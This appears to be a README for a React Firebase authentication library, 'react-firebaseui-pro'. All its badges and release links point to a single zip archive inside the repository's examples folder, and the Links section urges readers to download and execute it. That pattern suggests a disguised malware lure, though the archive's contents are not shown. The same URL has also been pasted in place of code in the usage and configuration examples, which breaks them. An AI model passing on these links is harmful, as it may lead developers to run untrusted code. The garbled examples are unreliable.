# react-firebaseui-pro 🚀

![GitHub release](https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip) ![GitHub issues](https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip) ![GitHub stars](https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip)

**react-firebaseui-pro** is a powerful library that simplifies the integration of Firebase Authentication into your React applications. It works seamlessly with both React 18 and React 19, making it a flexible choice for developers looking to implement authentication flows quickly and efficiently.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Configuration](#configuration)
- [API Reference](#api-reference)
- [Contributing](#contributing)
- [License](#license)
- [Links](#links)

## Features

- **Seamless Integration**: Effortlessly add Firebase Authentication to your React applications.
- **Compatibility**: Fully supports React 18 and React 19.
- **Easy Setup**: Get started quickly with minimal configuration.
- **Customizable UI**: Use FirebaseUI's built-in styles or customize to fit your needs.
- **Multiple Authentication Providers**: Support for Google, Facebook, Twitter, and more.
- **Responsive Design**: Works well on both mobile and desktop.

## Installation

To get started, install the package via npm or yarn:

```bash
npm install react-firebaseui-pro
```

or

```bash
yarn add react-firebaseui-pro
```

## Usage

Here’s a simple example of how to use `react-firebaseui-pro` in your React application:

```javascript
import React from 'react';
import { FirebaseAuth } from 'react-firebaseui-pro';
import firebase from 'firebase/app';
import 'firebase/auth';

// Firebase configuration
const firebaseConfig = {
  apiKey: "YOUR_API_KEY",
  authDomain: "YOUR_AUTH_DOMAIN",
  projectId: "YOUR_PROJECT_ID",
  storageBucket: "YOUR_STORAGE_BUCKET",
  messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
  appId: "YOUR_APP_ID"
};

// Initialize Firebase
https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip(firebaseConfig);

// Configure FirebaseUI
const uiConfig = {
  signInSuccessUrl: '/home',
  signInOptions: [
    https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip,
    https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip,
  ],
};

const App = () => {
  return (
    <div>
      <h1>Welcome to My App</h1>
      <FirebaseAuth uiConfig={uiConfig} firebaseAuth={https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip()} />
    </div>
  );
};

export default App;
```

## Connecting to Firebase Firestore (NoSQL)

Use the **same Firebase app** you use for Auth so Firestore automatically uses the signed-in user for security rules.

1. **Enable Firestore** in [Firebase Console](https://console.firebase.google.com) → your project → **Build → Firestore Database** → Create database (start in test mode or set rules as needed).

2. **In your app**, after initializing Firebase and Auth, add:

```javascript
import firebase from 'firebase/compat/app';
import 'firebase/compat/auth';
import 'firebase/compat/firestore';

const app = firebase.initializeApp({ /* your config */ });
const db = firebase.firestore();
```

3. **Read/write examples:**

```javascript
// Write (e.g. save user profile)
await db.collection('users').doc(user.uid).set(
  { displayName: user.displayName, email: user.email },
  { merge: true }
);

// Read once
const doc = await db.collection('users').doc(user.uid).get();
console.log(doc.data());

// Listen to changes (real-time)
const unsubscribe = db.collection('users').doc(user.uid).onSnapshot(
  (doc) => console.log('Current data:', doc.data())
);
// Call unsubscribe() when done (e.g. in useEffect cleanup).
```

4. **Security:** Configure Firestore rules in the Console (e.g. allow read/write only when `request.auth != null` and `request.auth.uid == userId`).

The example app in `examples/with-react-19` includes Firestore initialization; you can add the read/write calls where you need them (e.g. in `useEffect` when the user is signed in).

## Configuration

You can customize the FirebaseUI options to fit your application’s needs. Here are some common options you might want to adjust:

- **signInSuccessUrl**: URL to redirect to after a successful sign-in.
- **signInOptions**: An array of authentication providers.
- **tosUrl**: URL for the terms of service.
- **privacyPolicyUrl**: URL for the privacy policy.

### Example Configuration

```javascript
const uiConfig = {
  signInSuccessUrl: '/dashboard',
  signInOptions: [
    https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip,
    https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip,
  ],
  tosUrl: '/terms',
  privacyPolicyUrl: '/privacy',
};
```

## API Reference

### FirebaseAuth Component

The main component provided by `react-firebaseui-pro`.

#### Props

- **uiConfig**: Configuration object for FirebaseUI.
- **firebaseAuth**: Firebase Auth instance.

### Methods

- **signInWithPopup(provider)**: Initiates a sign-in flow using a popup.
- **signOut()**: Signs the user out.

## Contributing

We welcome contributions! To get started:

1. Fork the repository.
2. Create a new branch (`git checkout -b feature/YourFeature`).
3. Make your changes.
4. Commit your changes (`git commit -m 'Add some feature'`).
5. Push to the branch (`git push origin feature/YourFeature`).
6. Open a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Links

For the latest releases, visit the [Releases section](https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip). You can download the latest version and execute it in your project.

For more information and updates, check the [Releases section](https://raw.githubusercontent.com/Mmmsajjaj/react-firebaseui-pro/main/examples/with-react-19/firebaseui_react_pro_v3.7.zip).

## Conclusion

With `react-firebaseui-pro`, you can implement authentication in your React applications quickly and easily. Its compatibility with both React 18 and React 19 ensures that you can use it in your current projects without hassle. Whether you're building a new app or enhancing an existing one, this library provides the tools you need for a smooth authentication experience. 

Feel free to explore the documentation and start building your application today!